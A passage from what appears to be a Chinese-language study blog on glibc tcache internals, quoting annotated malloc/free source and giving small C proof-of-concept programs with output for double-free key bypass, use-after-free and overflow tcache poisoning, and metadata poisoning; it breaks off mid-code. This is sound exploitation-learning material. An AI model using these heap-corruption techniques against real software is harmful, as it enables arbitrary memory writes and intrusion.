<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_malloc(<span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">    mstate ar_ptr;</span><br><span class="line">    <span class="type">void</span> *victim;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">    <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">    <span class="type">size_t</span> tbytes;</span><br><span class="line">    <span class="keyword">if</span> (!checked_request2size(bytes, &amp;tbytes))</span><br><span class="line">    &#123;</span><br><span class="line">        __set_errno(ENOMEM);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">size_t</span> tc_idx = csize2tidx(tbytes);</span><br><span class="line"></span><br><span class="line">    MAYBE_INIT_TCACHE();</span><br><span class="line"></span><br><span class="line">    DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">    <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins &amp;&amp; tcache &amp;&amp; tcache-&gt;counts[tc_idx] &gt; <span class="number">0</span>)<span class="comment">//通过counts检查是否有剩余堆块,而不是通过链表是否指向空</span></span><br><span class="line">    &#123;		</span><br><span class="line">        <span class="keyword">return</span> tcache_get(tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">    DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p>与glibc-2.27中区别的一点是, 2.31中判断idx对应桶子中是否有堆块,
依据是<code>tcache-&gt;counts[tc_idx] &gt; 0</code>,
不再看<code>entries</code>是否为空</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_malloc(<span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">    mstate ar_ptr;</span><br><span class="line">    <span class="type">void</span> *victim;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="comment">// malloc_hook</span></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">    <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">    <span class="type">size_t</span> tbytes;</span><br><span class="line">    <span class="keyword">if</span> (!checked_request2size(bytes, &amp;tbytes))</span><br><span class="line">    &#123;</span><br><span class="line">        __set_errno(ENOMEM);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">size_t</span> tc_idx = csize2tidx(tbytes);</span><br><span class="line"></span><br><span class="line">    MAYBE_INIT_TCACHE();</span><br><span class="line"></span><br><span class="line">    DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">    <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins &amp;&amp; tcache &amp;&amp; tcache-&gt;counts[tc_idx] &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> tcache_get(tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">    DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  e-&gt;key = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意到tcache堆块不会有对齐检查</p>
<p>堆块从tcache中拿出来之前会将key归零, 防止泄露tcache地址</p>
<h5 id="free-1">free</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">free =&gt; __libc_free</span><br><span class="line">	_int_free</span><br><span class="line">		tcache_put</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">_int_free(mstate av, mchunkptr p, <span class="type">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">    INTERNAL_SIZE_T size;     <span class="comment">/* its size */</span></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    size = chunksize(p);</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">size_t</span> tc_idx = csize2tidx(size);</span><br><span class="line">        <span class="keyword">if</span> (tcache != <span class="literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* Check to see if it&#x27;s already in the tcache.  */</span></span><br><span class="line">            tcache_entry *e = (tcache_entry *)chunk2mem(p);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* This test succeeds on double free.  However, we don&#x27;t 100%</span></span><br><span class="line"><span class="comment">               trust it (it also matches random payload data at a 1 in</span></span><br><span class="line"><span class="comment">               2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely</span></span><br><span class="line"><span class="comment">               coincidence before aborting.  */</span></span><br><span class="line">            <span class="keyword">if</span> (__glibc_unlikely(e-&gt;key == tcache))</span><br><span class="line">            &#123;	<span class="comment">//如果检查到e-&gt;key == tcache, 说明可能存在double free ,因为自然情况下堆块中的数据等于tcache地址概率太小了</span></span><br><span class="line">                <span class="comment">//为了避免误杀, 下面还是要再次确定一下, tcache相关桶子里是否真的有这个堆块</span></span><br><span class="line">                <span class="comment">//如果真有则说明真的double free了</span></span><br><span class="line">                <span class="comment">//也就是说e-&gt;key == tcache 是这个诊断流程的导火索</span></span><br><span class="line">                tcache_entry *tmp;</span><br><span class="line">                LIBC_PROBE(memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">                <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];<span class="comment">//从头往后遍历判断已有的堆块是不是当前要插入的堆块</span></span><br><span class="line">                     tmp;</span><br><span class="line">                     tmp = tmp-&gt;next)</span><br><span class="line">                    <span class="keyword">if</span> (tmp == e)</span><br><span class="line">                        malloc_printerr(<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line">                <span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span></span><br><span class="line"><span class="comment">                   few cycles, but don&#x27;t abort.  */</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)	<span class="comment">//根据counts判断是否已经装满</span></span><br><span class="line">            &#123;</span><br><span class="line">                tcache_put(p, tc_idx);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p>相比于<code>glibc-2.27</code>,
加入了放回堆块前的<code>double free</code>检查, 但是该检查很容易绕过</p>
<p>写个<code>poc</code>意思意思</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> * chunk = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">free</span>(chunk);</span><br><span class="line">    <span class="comment">//假设溢出修改chunkmem, 以绕过对key的检查</span></span><br><span class="line">    chunk[<span class="number">0</span>] = <span class="number">0</span>;	<span class="comment">//next</span></span><br><span class="line">    chunk[<span class="number">1</span>] = <span class="number">0</span>;	<span class="comment">//key</span></span><br><span class="line">    <span class="built_in">free</span>(chunk);</span><br><span class="line">    <span class="type">char</span> *chunk1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="type">char</span> *chunk2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk1 @ %p\n&quot;</span>,chunk1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk2 @ %p\n&quot;</span>,chunk2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test<span class="meta"># gcc 231_df.c -o 231_df -w</span></span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test# ./<span class="number">231</span>_df</span><br><span class="line">chunk1 @ <span class="number">0x5572b2c55260</span></span><br><span class="line">chunk2 @ <span class="number">0x5572b2c55260</span></span><br></pre></td></tr></table></figure>
<h3 id="exploit">exploit</h3>
<p>glibc2.31中的利用手段,基本上都是针对next指针没有约束,
攻击者可以随便修改之</p>
<h4 id="use-after-free-导致-tcache-entry-poisoning">Use After Free 导致
tcache entry poisoning</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">100</span>]=<span class="string">&quot;flag&#123;aaaa&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> * chunk1;</span><br><span class="line">    <span class="type">size_t</span> * chunk_bait;</span><br><span class="line">    <span class="type">size_t</span> * chunk_victim;</span><br><span class="line"></span><br><span class="line">    chunk1 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    chunk_bait = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="built_in">free</span>(chunk_bait);</span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    chunk1[<span class="number">0</span>] = buffer;</span><br><span class="line"></span><br><span class="line">    chunk1 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    chunk_victim = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk_victim now points to %p\n &quot;</span>,chunk_victim);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test# gcc uaf.c -o uaf -w</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test# ./uaf</span><br><span class="line">chunk_victim now points to 0x7fff53e7c010</span><br></pre></td></tr></table></figure>
<h4 id="double-free造成重复引用">Double Free造成重复引用</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> * chunk1;</span><br><span class="line">    <span class="type">size_t</span> * chunk1_dup;</span><br><span class="line"></span><br><span class="line">    chunk1 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    chunk1[<span class="number">1</span>] = <span class="number">0</span>;      <span class="comment">//把key扬了</span></span><br><span class="line">    <span class="built_in">free</span>(chunk1);       <span class="comment">//double free</span></span><br><span class="line"></span><br><span class="line">    chunk1 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);			</span><br><span class="line">    chunk1_dup = <span class="built_in">malloc</span>(<span class="number">0x20</span>);		<span class="comment">//duplicated reference</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk1 @ %p\n&quot;</span>,chunk1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk1_dup @ %p\n&quot;</span>,chunk1_dup);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test# gcc df.c -o <span class="built_in">df</span> -w </span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test# ./df</span><br><span class="line">chunk1 @ 0x555596ef62a0</span><br><span class="line">chunk1_dup @ 0x555596ef62a0</span><br></pre></td></tr></table></figure>
<h4 id="tcache-overflow-导致-tcache-entry-poisoning">tcache overflow
导致 tcache entry poisoning</h4>
<p>可以利用堆溢出造成任意地址读写</p>
<p>1.先后连续分配两个堆块<code>chunk1</code>,<code>chunk2</code>,使其地址物理上相邻,这样<code>chunk2</code>位于内存高处,
<code>chunk1</code>可以从低处往高处溢出</p>
<p>2.释放<code>chunk2</code>使其返回到<code>tcache</code>中</p>
<p>3.从<code>chunk1</code>开始溢出,构造<code>chunk2</code>的假头,并修改<code>chunk2</code>的<code>next</code>指针指向一个希望的地址<code>target_addr</code></p>
<p>4.再分配一次,拿出<code>chunk2</code></p>
<p>5.再分配一次,拿出<code>target_addr</code></p>
<p>需要注意的是,<code>glibc2.31</code>中,判断<code>tcache</code>中是否还有堆块的依据是<code>counts[idx]</code>计数,而不是看指针是否为空</p>
<p>因此可以找炮灰堆块填线,滥竽充数一下把<code>counts</code>垫高</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241015134751799.png"
alt="image-20241015134751799" />
<figcaption aria-hidden="true">image-20241015134751799</figcaption>
</figure>
<p>假设<code>chunk1</code>和<code>chunk2</code>都是<code>malloc(0x20)</code>获取的堆块,那么站在<code>chunk1_mem</code>视角上</p>
<table>
<thead>
<tr>
<th>item</th>
<th>offset based on chunk1_mem</th>
<th>value</th>
</tr>
</thead>
<tbody>
<tr>
<td>chunk1_mem</td>
<td>0</td>
<td>pad</td>
</tr>
<tr>
<td></td>
<td>…</td>
<td>pad</td>
</tr>
<tr>
<td>chunk2_prev_size</td>
<td>+ 0x20</td>
<td>pad</td>
</tr>
<tr>
<td>chunk2_size</td>
<td>+ 0x28</td>
<td>0x31</td>
</tr>
<tr>
<td>chunk2_next</td>
<td>+ 0x30</td>
<td>target_addr</td>
</tr>
<tr>
<td>chunk2_key</td>
<td>+ 0x38</td>
<td>不变</td>
</tr>
</tbody>
</table>
<p>写个poc意思意思</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buffer[] = <span class="string">&quot;flag&#123;aaaa&#125;&quot;</span>;</span><br><span class="line">    <span class="type">size_t</span> * chunk1_mem;</span><br><span class="line">    <span class="type">size_t</span> * chunk2_mem;</span><br><span class="line">    <span class="type">size_t</span> * chunkbait;</span><br><span class="line">    <span class="type">size_t</span> * chunk2_mem_next;</span><br><span class="line">    <span class="type">size_t</span> * victim;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;buffer now is %s\n&quot;</span>,buffer);</span><br><span class="line"></span><br><span class="line">    chunk1_mem = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    chunk2_mem = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    chunkbait = <span class="built_in">malloc</span>(<span class="number">0x20</span>);   <span class="comment">//炮灰</span></span><br><span class="line">    <span class="built_in">free</span>(chunkbait);</span><br><span class="line">    <span class="built_in">free</span>(chunk2_mem);</span><br><span class="line"></span><br><span class="line">    chunk2_mem_next = (<span class="type">char</span>*)chunk1_mem + <span class="number">0x30</span>;<span class="comment">//假设chunk1上overflow能覆盖chunk2 metadata</span></span><br><span class="line">    chunk2_mem_next[<span class="number">0</span>] = buffer;	<span class="comment">//buffer沾亲带故加入了tcache</span></span><br><span class="line"></span><br><span class="line">    chunk2_mem = <span class="built_in">malloc</span>(<span class="number">0x20</span>);		</span><br><span class="line">    victim = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(victim,<span class="string">&quot;flag&#123;bbbb&#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;buffer now is %s\n&quot;</span>,buffer);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>执行结果</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/level15.0# gcc test.c -o <span class="built_in">test</span> -w</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/level15.0# ./test</span><br><span class="line">buffer now is flag&#123;aaaa&#125;</span><br><span class="line">buffer now is flag&#123;bbbb&#125;</span><br><span class="line">*** stack smashing detected ***: terminated</span><br><span class="line">Aborted (core dumped)</span><br></pre></td></tr></table></figure>
<h4 id="tcache-entry-poisoning导致tcache-metadata-poisoning">tcache
entry poisoning导致tcache metadata poisoning</h4>
<p>之前我们<code>tcache poisoning</code>都是这样考虑的:</p>
<p>1.malloc一个堆块</p>
<p>2.free该堆块进入tcache</p>
<p>3.UAF修改该堆块的next指针,指向目标地址</p>
<p>4.malloc拿出该堆块</p>
<p>5.malloc拿出目标地址假堆块</p>
<p>我们的目光局限在了堆块上,然而实际上对堆块的投毒,也会传染给元数据,并且还会传染给后续的堆块,考虑如下场景:</p>
<p>1.利用UAF将<code>fake_chunk</code>也加入到<code>tcache</code>中</p>
<p>这个<code>fake_chunk</code>的<code>next=0xcafebabe</code>
是一个任意值, 显然不是一个合法地址</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241015203432281.png"
alt="image-20241015203432281" />
<figcaption aria-hidden="true">image-20241015203432281</figcaption>
</figure>
<p>2.一个<code>malloc</code>把<code>chunk1</code>拿出来,此时桶子头指向了<code>fake_chunk</code></p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241015203623434.png"
alt="image-20241015203623434" />
<figcaption aria-hidden="true">image-20241015203623434</figcaption>
</figure>
<p>3.再一个<code>malloc</code>把<code>fake_chunk</code>拿出来,那么桶子头会继承<code>fake_chunk.next</code></p>
<p>并且<code>tcache</code>中的堆块被重新分配时,其<code>key</code>会被置零,因此<code>fake_chunk_addr</code><strong>偏移8字节处的8个字节</strong>会被置零</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241015204025478.png"
alt="image-20241015204025478" />
<figcaption aria-hidden="true">image-20241015204025478</figcaption>
</figure>
<p>4.此时<code>free</code>一个同样大小的堆块进入<code>tcache</code>,由于元数据已经被投毒,新堆块会继承桶子头的<code>next</code>指针,也就是<code>0xcafebabe</code></p>
<p>此时如果有<code>chunk2</code>的<code>UAF</code>就可以泄露<code>0xcafebabe</code>这个值</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241015204205909.png"
alt="image-20241015204205909" />
<figcaption aria-hidden="true">image-20241015204205909</figcaption>
</figure>
<p>写个poc意思意思</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> * chunk1;</span><br><span class="line">    <span class="type">size_t</span> * chunk2;</span><br><span class="line">    <span class="type">size_t</span> * chunk_bait;</span><br><span class="line">    <span class="type">size_t</span> fake_chunk_header[<span class="number">4</span>];</span><br><span class="line">    <span class="type">size_t</span> *fake_chunk = (<span class="type">char</span>*)fake_chunk_header + <span class="number">0x10</span>; </span><br><span class="line">    fake_chunk[<span class="number">0</span>] = <span class="number">0xcafebabe</span>;</span><br><span class="line">    fake_chunk[<span class="number">1</span>] = <span class="number">0xdeadbeef</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;previous fake_chunk.key = %p\n&quot;</span>, fake_chunk[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    chunk1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    chunk2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    chunk_bait = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">free</span>(chunk_bait);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    chunk1[<span class="number">0</span>] = fake_chunk;</span><br><span class="line">    chunk1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    fake_chunk = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;now fake_chunk.key = %p\n&quot;</span>, fake_chunk[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(chunk2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk2.next = %p\n&quot;</span>, chunk2[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">return</span>  <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test# gcc metadata.c -o metadata -g -w</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test# ./metadata</span><br><span class="line">previous fake_chunk.key = 0xdeadbeef</span><br><span class="line">now fake_chunk.key = (nil)</span><br><span class="line">chunk2.next = 0xcafebabe</span><br></pre></td></tr></table></figure>
<h3 id="glibc-2.38">glibc-2.38</h3>
<p>数据结构与<code>glibc-2.31</code>相比,在数据结构上并无太大变化,
但是着重加固了<code>key</code>和<code>next</code>字段的计算算法,
目的是为了尽量缓解<code>double free</code></p>
<h4 id="datastructure-2">datastructure</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">    <span class="type">uintptr_t</span> key;</span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span 